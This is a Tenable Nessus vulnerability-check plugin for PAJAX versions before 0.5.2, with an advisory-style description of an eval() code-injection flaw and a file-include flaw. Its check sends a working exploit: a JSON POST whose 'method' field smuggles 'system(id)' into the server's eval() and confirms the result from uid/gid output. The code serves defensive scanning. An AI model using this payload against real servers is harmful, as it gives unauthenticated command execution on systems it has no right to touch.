#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is susceptible to
multiple issues. 

Description :

The remote host is running PAJAX, a PHP library for remote
asynchronous objects in Javascript. 

The version of PAJAX installed on the remote host fails to validate
input to the 'pajax/pajax_call_dispatcher.php' script before using it
in a PHP 'eval()' function.  An unauthenticated attacker can exploit
this flaw to execute arbitrary command on the remote host subject to
the privileges of the web server user id. 

In addition, the application also reportedly fails to validate input
to classnames before using it in a PHP 'require()' function in
'Pajax.class.php', which allows for local file include attacks. 

See also :

http://www.redteam-pentesting.de/advisories/rt-sa-2006-001.txt
http://www.auberger.com/pajax/3/

Solution :

Upgrade to PAJAX version 0.5.2 or later. 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21227);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1551", "CVE-2006-1789");
  script_bugtraq_id(17519);
  script_xref(name:"OSVDB", value:"24618");
  script_xref(name:"OSVDB", value:"24862");

  script_name(english:"PAJAX < 0.5.2 Multiple Vulnerabilities");
  script_summary(english:"Tries to execute code using PAJAX");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/pajax", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/pajax/pajax_call_dispatcher.php");

  # Check whether the affected script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (res == "null")
  {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    postdata = string(
      '{',
        '"id": "ae9b2743a65c11b856f9ad02b12e5183", ',
        '"className": "TestSession", ',
        '"method": "getCount;system(', cmd, ');$obj->getCount", ',
      '}'
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: Mozilla/4.75 [en] (X11, U; Nessus)\r\n",
      "Content-Type: text/json\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see the code in the XML debug output.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
      contents = res - strstr(res, "<br />");
      if (isnull(contents)) contents = res;

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able execute the command '", cmd, "' on the remote host;\n",
        "it produced the following output :\n",
        "\n",
        contents
      );

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
